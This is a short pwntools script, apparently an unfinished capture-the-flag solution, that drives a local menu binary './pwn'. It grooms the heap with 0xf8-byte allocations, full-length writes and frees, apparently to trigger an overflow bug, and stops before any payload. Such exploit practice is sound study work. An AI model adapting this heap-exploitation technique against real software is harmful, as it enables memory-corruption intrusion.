from pwn import *
p = process("./pwn")


def add(size, ctx):
    p.recvuntil("command:\n")
    p.sendline("1")
    p.recvuntil("size:\n")
    p.sendline(str(size))
    p.recvuntil("content:\n")
    p.sendline(ctx)


def delete(index):
    p.recvuntil("command:\n")
    p.sendline("2")
    p.recvuntil("index:\n")
    p.sendline(str(index))


def show(index):
    p.recvuntil("command:\n")
    p.sendline("3")
    p.recvuntil("index:\n")
    p.sendline(str(index))


def modify(index, ctx):
    p.recvuntil("command:\n")
    p.sendline("4")
    p.recvuntil("index:\n")
    p.sendline(str(index))
    p.recvuntil("content:\n")
    p.sendline(ctx)


add(0xf8, '0')
add(0xf8, '1' * 0xf8)
add(0xf8, '2')
add(0xf8, '3')
delete(1)
add(0xf8, '1' * 0xf8)
delete(0)
#modify(1, 'a' * 0xf8)
p.interactive()